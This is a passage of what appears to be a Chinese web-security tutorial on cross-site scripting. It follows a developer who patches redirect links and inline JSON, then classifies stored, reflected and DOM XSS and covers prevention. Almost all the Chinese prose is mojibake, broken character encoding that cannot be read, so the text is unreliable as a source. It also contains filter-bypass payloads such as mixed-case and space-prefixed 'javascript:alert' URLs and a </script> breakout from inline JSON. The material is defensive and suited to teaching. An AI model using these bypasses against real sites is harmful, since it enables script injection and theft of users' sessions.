·çš„å­—ç¬¦ä¸²å¦‚æœå‡ºç°åœ¨ç‰¹å®šçš„ä½ç½®ä¹Ÿä¼šå¼•å‘ XSS æ”»å‡»ã€‚ å°æ˜çœ‰å¤´ä¸€çš±ï¼Œæƒ³åˆ°äº†è§£å†³åŠæ³•ï¼š 1234567891011// ç¦æ­¢ URL ä»¥ "javascript:" å¼€å¤´xss = getParameter("redirect_to").startsWith('javascript:');if (!xss) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; è·³è½¬... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; è·³è½¬... &lt;/a&gt;&#125; åªè¦ URL çš„å¼€å¤´ä¸æ˜¯ javascript:ï¼Œå°±å®‰å…¨äº†å§ï¼Ÿ å®‰å…¨ç»„éšæ‰‹åˆæ‰”äº†ä¸€ä¸ªè¿æ¥ï¼šhttp://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;) è¿™ä¹Ÿèƒ½æ‰§è¡Œï¼Ÿâ€¦..å¥½å§ï¼Œæµè§ˆå™¨å°±æ˜¯è¿™ä¹ˆå¼ºå¤§ã€‚ å°æ˜æ¬²å“­æ— æ³ªï¼Œåœ¨åˆ¤æ–­ URL å¼€å¤´æ˜¯å¦ä¸º javascript: æ—¶ï¼Œå…ˆæŠŠç”¨æˆ·è¾“å…¥è½¬æˆäº†å°å†™ï¼Œç„¶åå†è¿›è¡Œæ¯”å¯¹ã€‚ ä¸è¿‡ï¼Œæ‰€è°“â€œé“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆâ€ã€‚é¢å¯¹å°æ˜çš„é˜²æŠ¤ç­–ç•¥ï¼Œå®‰å…¨ç»„å°±æ„é€ äº†è¿™æ ·ä¸€ä¸ªè¿æ¥ï¼š 1http://xxx/?redirect_to=%20javascript:alert(&apos;XSS&apos;) %20javascript:alert(&#39;XSS&#39;) ç»è¿‡ URL è§£æåå˜æˆ javascript:alert(&#39;XSS&#39;)ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ä»¥ç©ºæ ¼å¼€å¤´ã€‚è¿™æ ·æ”»å‡»è€…å¯ä»¥ç»•è¿‡åç«¯çš„å…³é”®è¯è§„åˆ™ï¼ŒåˆæˆåŠŸçš„å®Œæˆäº†æ³¨å…¥ã€‚ æœ€ç»ˆï¼Œå°æ˜é€‰æ‹©äº†ç™½åå•çš„æ–¹æ³•ï¼Œå½»åº•è§£å†³äº†è¿™ä¸ªæ¼æ´ï¼š 1234567891011121314// æ ¹æ®é¡¹ç›®æƒ…å†µè¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢æ‰ "javascript:" é“¾æ¥ã€éæ³• scheme ç­‰allowSchemes = ["http", "https"];valid = isValid(getParameter("redirect_to"), allowSchemes);if (valid) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; è·³è½¬... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; è·³è½¬... &lt;/a&gt;&#125; é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š åšäº† HTML è½¬ä¹‰ï¼Œå¹¶ä¸ç­‰äºé«˜æ•æ— å¿§ã€‚ å¯¹äºé“¾æ¥è·³è½¬ï¼Œå¦‚ &lt;a href=&quot;xxx&quot; æˆ– location.href=&quot;xxx&quot;ï¼Œè¦æ£€éªŒå…¶å†…å®¹ï¼Œç¦æ­¢ä»¥ javascript: å¼€å¤´çš„é“¾æ¥ï¼Œå’Œå…¶ä»–éæ³•çš„ schemeã€‚ æ ¹æ®ä¸Šä¸‹æ–‡é‡‡ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™æŸå¤©ï¼Œå°æ˜ä¸ºäº†åŠ å¿«ç½‘é¡µçš„åŠ è½½é€Ÿåº¦ï¼ŒæŠŠä¸€ä¸ªæ•°æ®é€šè¿‡ JSON çš„æ–¹å¼å†…è”åˆ° HTML ä¸­ï¼š 123&lt;script&gt; var initData = &lt;%= data.toJSON() %&gt;&lt;/script&gt; æ’å…¥ JSON çš„åœ°æ–¹ä¸èƒ½ä½¿ç”¨ escapeHTML()ï¼Œå› ä¸ºè½¬ä¹‰ &quot; åï¼ŒJSON æ ¼å¼ä¼šè¢«ç ´åã€‚ ä½†å®‰å…¨ç»„åˆå‘ç°æœ‰æ¼æ´ï¼ŒåŸæ¥è¿™æ ·å†…è” JSON ä¹Ÿæ˜¯ä¸å®‰å…¨çš„ï¼š å½“ JSON ä¸­åŒ…å« U+2028 æˆ– U+2029 è¿™ä¸¤ä¸ªå­—ç¬¦æ—¶ï¼Œä¸èƒ½ä½œä¸º JavaScript çš„å­—é¢é‡ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ›å‡ºè¯­æ³•é”™è¯¯ã€‚ å½“ JSON ä¸­åŒ…å«å­—ç¬¦ä¸² &lt;/script&gt; æ—¶ï¼Œå½“å‰çš„ script æ ‡ç­¾å°†ä¼šè¢«é—­åˆï¼Œåé¢çš„å­—ç¬¦ä¸²å†…å®¹æµè§ˆå™¨ä¼šæŒ‰ç…§ HTML è¿›è¡Œè§£æï¼›é€šè¿‡å¢åŠ ä¸‹ä¸€ä¸ª &lt;script&gt; æ ‡ç­¾ç­‰æ–¹æ³•å°±å¯ä»¥å®Œæˆæ³¨å…¥ã€‚ äºæ˜¯æˆ‘ä»¬åˆè¦å®ç°ä¸€ä¸ª escapeEmbedJSON() å‡½æ•°ï¼Œå¯¹å†…è” JSON è¿›è¡Œè½¬ä¹‰ã€‚ è½¬ä¹‰è§„åˆ™å¦‚ä¸‹ï¼š |å­—ç¬¦|è½¬ä¹‰åçš„å­—ç¬¦| |-|-| |U+2028|\u2028| |U+2029|\u2029| |&lt;|\u003c| ä¿®å¤åçš„ä»£ç å¦‚ä¸‹ï¼š 12&lt;script&gt;var initData = &lt;%= escapeEmbedJSON(data.toJSON()) %&gt; é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š HTML è½¬ä¹‰æ˜¯éå¸¸å¤æ‚çš„ï¼Œåœ¨ä¸åŒçš„æƒ…å†µä¸‹è¦é‡‡ç”¨ä¸åŒçš„è½¬ä¹‰è§„åˆ™ã€‚å¦‚æœé‡‡ç”¨äº†é”™è¯¯çš„è½¬ä¹‰è§„åˆ™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šåŸ‹ä¸‹ XSS éšæ‚£ã€‚ åº”å½“å°½é‡é¿å…è‡ªå·±å†™è½¬ä¹‰åº“ï¼Œè€Œåº”å½“é‡‡ç”¨æˆç†Ÿçš„ã€ä¸šç•Œé€šç”¨çš„è½¬ä¹‰åº“ã€‚ æ¼æ´æ€»ç»“å°æ˜çš„ä¾‹å­è®²å®Œäº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç³»ç»Ÿçš„çœ‹ä¸‹ XSS æœ‰å“ªäº›æ³¨å…¥çš„æ–¹æ³•ï¼š åœ¨ HTML ä¸­å†…åµŒçš„æ–‡æœ¬ä¸­ï¼Œæ¶æ„å†…å®¹ä»¥ script æ ‡ç­¾å½¢æˆæ³¨å…¥ã€‚ åœ¨å†…è”çš„ JavaScript ä¸­ï¼Œæ‹¼æ¥çš„æ•°æ®çªç ´äº†åŸæœ¬çš„é™åˆ¶ï¼ˆå­—ç¬¦ä¸²ï¼Œå˜é‡ï¼Œæ–¹æ³•åç­‰ï¼‰ã€‚ åœ¨æ ‡ç­¾å±æ€§ä¸­ï¼Œæ¶æ„å†…å®¹åŒ…å«å¼•å·ï¼Œä»è€Œçªç ´å±æ€§å€¼çš„é™åˆ¶ï¼Œæ³¨å…¥å…¶ä»–å±æ€§æˆ–è€…æ ‡ç­¾ã€‚ åœ¨æ ‡ç­¾çš„ hrefã€src ç­‰å±æ€§ä¸­ï¼ŒåŒ…å« javascript: ç­‰å¯æ‰§è¡Œä»£ç ã€‚ åœ¨ onloadã€onerrorã€onclick ç­‰äº‹ä»¶ä¸­ï¼Œæ³¨å…¥ä¸å—æ§åˆ¶ä»£ç ã€‚ åœ¨ style å±æ€§å’Œæ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç±»ä¼¼ background-image:url(&quot;javascript:...&quot;); çš„ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰ã€‚ åœ¨ style å±æ€§å’Œæ ‡ç­¾ä¸­ï¼ŒåŒ…å«ç±»ä¼¼ expression(...) çš„ CSS è¡¨è¾¾å¼ä»£ç ï¼ˆæ–°ç‰ˆæœ¬æµè§ˆå™¨å·²ç»å¯ä»¥é˜²èŒƒï¼‰ã€‚ æ€»ä¹‹ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰å°†ç”¨æˆ·è¾“å…¥çš„æ–‡æœ¬è¿›è¡Œåˆé€‚çš„è¿‡æ»¤ï¼Œå°±è´¸ç„¶æ’å…¥åˆ° HTML ä¸­ï¼Œè¿™å¾ˆå®¹æ˜“é€ æˆæ³¨å…¥æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¼æ´ï¼Œæ„é€ å‡ºæ¶æ„çš„ä»£ç æŒ‡ä»¤ï¼Œè¿›è€Œåˆ©ç”¨æ¶æ„ä»£ç å±å®³æ•°æ®å®‰å…¨ã€‚ XSS æ”»å‡»çš„åˆ†ç±»é€šè¿‡ä¸Šè¿°å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»å¯¹ XSS æœ‰äº†ä¸€äº›è®¤è¯†ã€‚ ä»€ä¹ˆæ˜¯ XSSCross-Site Scriptingï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ç®€ç§° XSSï¼Œæ˜¯ä¸€ç§ä»£ç æ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œã€‚åˆ©ç”¨è¿™äº›æ¶æ„è„šæœ¬ï¼Œæ”»å‡»è€…å¯è·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯å¦‚ Cookieã€SessionID ç­‰ï¼Œè¿›è€Œå±å®³æ•°æ®å®‰å…¨ã€‚ ä¸ºäº†å’Œ CSS åŒºåˆ†ï¼Œè¿™é‡ŒæŠŠæ”»å‡»çš„ç¬¬ä¸€ä¸ªå­—æ¯æ”¹æˆäº† Xï¼Œäºæ˜¯å«åš XSSã€‚ XSS çš„æœ¬è´¨æ˜¯ï¼šæ¶æ„ä»£ç æœªç»è¿‡æ»¤ï¼Œä¸ç½‘ç«™æ­£å¸¸çš„ä»£ç æ··åœ¨ä¸€èµ·ï¼›æµè§ˆå™¨æ— æ³•åˆ†è¾¨å“ªäº›è„šæœ¬æ˜¯å¯ä¿¡çš„ï¼Œå¯¼è‡´æ¶æ„è„šæœ¬è¢«æ‰§è¡Œã€‚ è€Œç”±äºç›´æ¥åœ¨ç”¨æˆ·çš„ç»ˆç«¯æ‰§è¡Œï¼Œæ¶æ„ä»£ç èƒ½å¤Ÿç›´æ¥è·å–ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæˆ–è€…åˆ©ç”¨è¿™äº›ä¿¡æ¯å†’å……ç”¨æˆ·å‘ç½‘ç«™å‘èµ·æ”»å‡»è€…å®šä¹‰çš„è¯·æ±‚ã€‚ åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç”±äºè¾“å…¥çš„é™åˆ¶ï¼Œæ³¨å…¥çš„æ¶æ„è„šæœ¬æ¯”è¾ƒçŸ­ã€‚ä½†å¯ä»¥é€šè¿‡å¼•å…¥å¤–éƒ¨çš„è„šæœ¬ï¼Œå¹¶ç”±æµè§ˆå™¨æ‰§è¡Œï¼Œæ¥å®Œæˆæ¯”è¾ƒå¤æ‚çš„æ”»å‡»ç­–ç•¥ã€‚ è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼šç”¨æˆ·æ˜¯é€šè¿‡å“ªç§æ–¹æ³•â€œæ³¨å…¥â€æ¶æ„è„šæœ¬çš„å‘¢ï¼Ÿ ä¸ä»…ä»…æ˜¯ä¸šåŠ¡ä¸Šçš„â€œç”¨æˆ·çš„ UGC å†…å®¹â€å¯ä»¥è¿›è¡Œæ³¨å…¥ï¼ŒåŒ…æ‹¬ URL ä¸Šçš„å‚æ•°ç­‰éƒ½å¯ä»¥æ˜¯æ”»å‡»çš„æ¥æºã€‚åœ¨å¤„ç†è¾“å…¥æ—¶ï¼Œä»¥ä¸‹å†…å®¹éƒ½ä¸å¯ä¿¡ï¼š æ¥è‡ªç”¨æˆ·çš„ UGC ä¿¡æ¯ æ¥è‡ªç¬¬ä¸‰æ–¹çš„é“¾æ¥ URL å‚æ•° POST å‚æ•° Referer ï¼ˆå¯èƒ½æ¥è‡ªä¸å¯ä¿¡çš„æ¥æºï¼‰ Cookie ï¼ˆå¯èƒ½æ¥è‡ªå…¶ä»–å­åŸŸæ³¨å…¥ï¼‰ XSS åˆ†ç±»æ ¹æ®æ”»å‡»çš„æ¥æºï¼ŒXSS æ”»å‡»å¯åˆ†ä¸ºå­˜å‚¨å‹ã€åå°„å‹å’Œ DOM å‹ä¸‰ç§ã€‚ |ç±»å‹|å­˜å‚¨åŒº|æ’å…¥ç‚¹| |-|-| |å­˜å‚¨å‹ XSS|åç«¯æ•°æ®åº“|HTML| |åå°„å‹ XSS|URL|HTML| |DOM å‹ XSS|åç«¯æ•°æ®åº“/å‰ç«¯å­˜å‚¨/URL|å‰ç«¯ JavaScript| å­˜å‚¨åŒºï¼šæ¶æ„ä»£ç å­˜æ”¾çš„ä½ç½®ã€‚ æ’å…¥ç‚¹ï¼šç”±è°å–å¾—æ¶æ„ä»£ç ï¼Œå¹¶æ’å…¥åˆ°ç½‘é¡µä¸Šã€‚ å­˜å‚¨å‹ XSSå­˜å‚¨å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚ ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ è¿™ç§æ”»å‡»å¸¸è§äºå¸¦æœ‰ç”¨æˆ·ä¿å­˜æ•°æ®çš„ç½‘ç«™åŠŸèƒ½ï¼Œå¦‚è®ºå›å‘å¸–ã€å•†å“è¯„è®ºã€ç”¨æˆ·ç§ä¿¡ç­‰ã€‚ åå°„å‹ XSSåå°„å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URL æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä» URL ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ åå°„å‹ XSS è·Ÿå­˜å‚¨å‹ XSS çš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨æ•°æ®åº“é‡Œï¼Œåå°„å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨ URL é‡Œã€‚ åå°„å‹ XSS æ¼æ´å¸¸è§äºé€šè¿‡ URL ä¼ é€’å‚æ•°çš„åŠŸèƒ½ï¼Œå¦‚ç½‘ç«™æœç´¢ã€è·³è½¬ç­‰ã€‚ ç”±äºéœ€è¦ç”¨æˆ·ä¸»åŠ¨æ‰“å¼€æ¶æ„çš„ URL æ‰èƒ½ç”Ÿæ•ˆï¼Œæ”»å‡»è€…å¾€å¾€ä¼šç»“åˆå¤šç§æ‰‹æ®µè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ã€‚ POST çš„å†…å®¹ä¹Ÿå¯ä»¥è§¦å‘åå°„å‹ XSSï¼Œåªä¸è¿‡å…¶è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼ˆéœ€è¦æ„é€ è¡¨å•æäº¤é¡µé¢ï¼Œå¹¶å¼•å¯¼ç”¨æˆ·ç‚¹å‡»ï¼‰ï¼Œæ‰€ä»¥éå¸¸å°‘è§ã€‚ DOM å‹ XSSDOM å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URLã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œå‰ç«¯ JavaScript å–å‡º URL ä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ DOM å‹ XSS è·Ÿå‰ä¸¤ç§ XSS çš„åŒºåˆ«ï¼šDOM å‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯ JavaScript è‡ªèº«çš„å®‰å…¨æ¼æ´ï¼Œè€Œå…¶ä»–ä¸¤ç§ XSS éƒ½å±äºæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´ã€‚ XSS æ”»å‡»çš„é¢„é˜²é€šè¿‡å‰é¢çš„ä»‹ç»å¯ä»¥å¾—çŸ¥ï¼ŒXSS æ”»å‡»æœ‰ä¸¤å¤§è¦ç´ ï¼š æ”»å‡»è€…æäº¤æ¶æ„ä»£ç ã€‚ æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚ é’ˆå¯¹ç¬¬ä¸€ä¸ªè¦ç´ ï¼šæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿåœ¨ç”¨æˆ·è¾“å…¥çš„è¿‡ç¨‹ï¼Œè¿‡æ»¤æ‰ç”¨æˆ·è¾“å…¥çš„æ¶æ„ä»£ç å‘¢ï¼Ÿ è¾“å…¥è¿‡æ»¤åœ¨ç”¨æˆ·æäº¤æ—¶ï¼Œç”±å‰ç«¯è¿‡æ»¤è¾“å…¥ï¼Œç„¶åæäº¤åˆ°åç«¯ã€‚è¿™æ ·åšæ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸å¯è¡Œã€‚ä¸€æ—¦æ”»å‡»è€…ç»•è¿‡å‰ç«¯è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯·æ±‚ï¼Œå°±å¯ä»¥æäº¤æ¶æ„ä»£ç äº†ã€‚ é‚£ä¹ˆï¼Œæ¢ä¸€ä¸ªè¿‡æ»¤æ—¶æœºï¼šåç«¯åœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åæŠŠâ€œå®‰å…¨çš„â€å†…å®¹ï¼Œè¿”å›ç»™å‰ç«¯ã€‚è¿™æ ·æ˜¯å¦å¯è¡Œå‘¢ï¼Ÿ æˆ‘ä»¬ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œä¸€ä¸ªæ­£å¸¸çš„ç”¨æˆ·è¾“å…¥äº† 5 &lt; 7 è¿™ä¸ªå†…å®¹ï¼Œåœ¨å†™å…¥æ•°æ®åº“å‰ï¼Œè¢«è½¬ä¹‰ï¼Œå˜æˆäº† 5 &amp;lt; 7ã€‚ é—®é¢˜æ˜¯ï¼šåœ¨æäº¤é˜¶æ®µï¼Œæˆ‘ä»¬å¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œã€‚ è¿™é‡Œçš„â€œå¹¶ä¸ç¡®å®šå†…å®¹è¦è¾“å‡ºåˆ°å“ªé‡Œâ€æœ‰ä¸¤å±‚å«ä¹‰ï¼š ç”¨æˆ·çš„è¾“å…¥å†…å®¹å¯èƒ½åŒæ—¶æä¾›ç»™å‰ç«¯å’Œå®¢æˆ·ç«¯ï¼Œè€Œä¸€æ—¦ç»è¿‡äº† escapeHTML()ï¼Œå®¢æˆ·ç«¯æ˜¾ç¤ºçš„å†…å®¹å°±å˜æˆäº†ä¹±ç ( 5 &amp;lt; 7 )ã€‚ åœ¨å‰ç«¯ä¸­ï¼Œä¸åŒçš„ä½ç½®æ‰€éœ€çš„ç¼–ç ä¹Ÿä¸åŒã€‚ å½“ 5 &amp;lt; 7 ä½œä¸º HTML æ‹¼æ¥é¡µé¢æ—¶ï¼Œå¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼š 1&lt;div title="comment"&gt;5 &amp;lt; 7&lt;/div&gt; å½“ 5 &amp;lt; 7 é€šè¿‡ Ajax è¿”å›ï¼Œç„¶åèµ‹å€¼ç»™ JavaScript çš„å˜é‡æ—¶ï¼Œå‰ç«¯å¾—åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯è½¬ä¹‰åçš„å­—ç¬¦ã€‚è¿™ä¸ªå†…å®¹ä¸èƒ½ç›´æ¥ç”¨äº Vue ç­‰æ¨¡æ¿çš„å±•ç¤ºï¼Œä¹Ÿä¸èƒ½ç›´æ¥ç”¨äºå†…å®¹é•¿åº¦è®¡ç®—ã€‚ä¸èƒ½ç”¨äºæ ‡é¢˜ã€alert ç­‰ã€‚ æ‰€ä»¥ï¼Œè¾“å…¥ä¾§è¿‡æ»¤èƒ½å¤Ÿåœ¨æŸäº›æƒ…å†µä¸‹è§£å†³ç‰¹å®šçš„ XSS é—®é¢˜ï¼Œä½†ä¼šå¼•å…¥å¾ˆå¤§çš„ä¸ç¡®å®šæ€§å’Œä¹±ç é—®é¢˜ã€‚åœ¨é˜²èŒƒ XSS æ”»å‡»æ—¶åº”é¿å…æ­¤ç±»æ–¹æ³•ã€‚ å½“ç„¶ï¼Œå¯¹äºæ˜ç¡®çš„è¾“å…¥ç±»å‹ï¼Œä¾‹å¦‚æ•°å­—ã€URLã€ç”µè¯å·ç ã€é‚®ä»¶åœ°å€ç­‰ç­‰å†…å®¹ï¼Œè¿›è¡Œè¾“å…¥è¿‡æ»¤è¿˜æ˜¯å¿…è¦çš„ã€‚ æ—¢ç„¶è¾“å…¥è¿‡æ»¤å¹¶éå®Œå…¨å¯é ï¼Œæˆ‘ä»¬å°±è¦é€šè¿‡â€œé˜²æ­¢æµè§ˆå™¨æ‰§è¡Œæ¶æ„ä»£ç â€æ¥é˜²èŒƒ XSSã€‚è¿™éƒ¨åˆ†åˆ†ä¸ºä¸¤ç±»ï¼š é˜²æ­¢ HTML ä¸­å‡ºç°æ³¨å…¥ã€‚ é˜²æ­¢ JavaScript æ‰§è¡Œæ—¶ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚ é¢„é˜²å­˜å‚¨å‹å’Œåå°„å‹ XSS æ”»å‡»å­˜å‚¨å‹å’Œåå°„å‹ XSS éƒ½æ˜¯åœ¨æœåŠ¡ç«¯å–å‡ºæ¶æ„ä»£ç åï¼Œæ’å…¥åˆ°å“åº” HTML é‡Œçš„ï¼Œæ”»å‡»è€…åˆ»æ„ç¼–å†™çš„â€œæ•°æ®â€è¢«å†…åµŒåˆ°â€œä»£ç â€ä¸­ï¼Œè¢«æµè§ˆå™¨æ‰€æ‰§è¡Œã€‚ é¢„é˜²è¿™ä¸¤ç§æ¼æ´ï¼Œæœ‰ä¸¤ç§å¸¸è§åšæ³•ï¼š æ”¹æˆçº¯å‰ç«¯æ¸²æŸ“ï¼ŒæŠŠä»£ç å’Œæ•°æ®åˆ†éš”å¼€ã€‚ å¯¹ HTML åšå……åˆ†è½¬ä¹‰ã€‚ çº¯å‰ç«¯æ¸²æŸ“çº¯å‰ç«¯æ¸²æŸ“çš„è¿‡ç¨‹ï¼š æµè§ˆå™¨å…ˆåŠ è½½ä¸€ä¸ªé™æ€ HTMLï¼Œæ­¤ HTML ä¸­ä¸åŒ…å«ä»»ä½•è·Ÿä¸šåŠ¡ç›¸å…³çš„æ•°æ®ã€‚ ç„¶åæµè§ˆå™¨æ‰§è¡Œ HTML ä¸­çš„ JavaScriptã€‚ JavaScript é€šè¿‡ Ajax åŠ è½½ä¸šåŠ¡æ•°æ®ï¼Œè°ƒç”¨ DOM API æ›´æ–°åˆ°é¡µé¢ä¸Šã€‚ åœ¨çº¯å‰ç«¯æ¸²æŸ“ä¸­ï¼Œæˆ‘ä»¬ä¼šæ˜ç¡®çš„å‘Šè¯‰æµè§ˆå™¨ï¼šä¸‹é¢è¦è®¾ç½®çš„å†…å®¹æ˜¯æ–‡æœ¬ï¼ˆ.innerTextï¼‰ï¼Œè¿˜æ˜¯å±æ€§ï¼ˆ.setAttributeï¼‰ï¼Œè¿˜æ˜¯æ ·å¼ï¼ˆ.styleï¼‰ç­‰ç­‰ã€‚æµè§ˆå™¨ä¸ä¼šè¢«è½»æ˜“çš„è¢«æ¬ºéª—ï¼Œæ‰§è¡Œé¢„æœŸå¤–çš„ä»£ç äº†ã€‚ ä½†çº¯å‰ç«¯æ¸²æŸ“è¿˜éœ€æ³¨æ„é¿å… DOM å‹ XSS æ¼æ´ï¼ˆä¾‹å¦‚ onload äº‹ä»¶å’Œ href ä¸­çš„ javascript:xxx ç­‰ï¼Œè¯·å‚è€ƒä¸‹æ–‡â€é¢„é˜² DOM å‹ XSS æ”»å‡»â€œéƒ¨åˆ†ï¼‰ã€‚ åœ¨å¾ˆå¤šå†…éƒ¨ã€ç®¡ç†ç³»ç»Ÿä¸­ï¼Œé‡‡ç”¨çº¯å‰ç«¯æ¸²æŸ“æ˜¯éå¸¸åˆé€‚çš„ã€‚ä½†å¯¹äºæ€§èƒ½è¦æ±‚é«˜ï¼Œæˆ–æœ‰ SEO éœ€æ±‚çš„é¡µé¢ï¼Œæˆ‘ä»¬ä»ç„¶è¦é¢å¯¹æ‹¼æ¥ HTML çš„é—®é¢˜ã€‚ è½¬ä¹‰ HTMLå¦‚æœæ‹¼æ¥ HTML æ˜¯å¿…è¦çš„ï¼Œå°±éœ€è¦é‡‡ç”¨åˆé€‚çš„è½¬ä¹‰åº“ï¼Œå¯¹ HTML æ¨¡æ¿å„å¤„æ’å…¥ç‚¹è¿›è¡Œå……åˆ†çš„è½¬ä¹‰ã€‚ å¸¸ç”¨çš„æ¨¡æ¿å¼•æ“ï¼Œå¦‚ doT.jsã€ejsã€FreeMarker ç­‰ï¼Œå¯¹äº HTML è½¬ä¹‰é€šå¸¸åªæœ‰ä¸€ä¸ªè§„åˆ™ï¼Œå°±æ˜¯æŠŠ &amp; &lt; &gt; &quot; &#39; / è¿™å‡ ä¸ªå­—ç¬¦è½¬ä¹‰æ‰ï¼Œç¡®å®èƒ½èµ·åˆ°ä¸€å®šçš„ XSS é˜²æŠ¤ä½œç”¨ï¼Œä½†å¹¶ä¸å®Œå–„ï¼š |XSS å®‰å…¨æ¼æ´|ç®€å•è½¬ä¹‰æ˜¯å¦æœ‰é˜²æŠ¤ä½œç”¨| |-|-| |HTML æ ‡ç­¾æ–‡å­—å†…å®¹|æœ‰| |HTML å±æ€§å€¼|æœ‰| |CSS å†…è”æ ·å¼|æ— | |å†…è” JavaScript|æ— | |å†…è” JSON|æ— | |è·³è½¬é“¾æ¥|æ— | æ‰€ä»¥è¦å®Œå–„ XSS 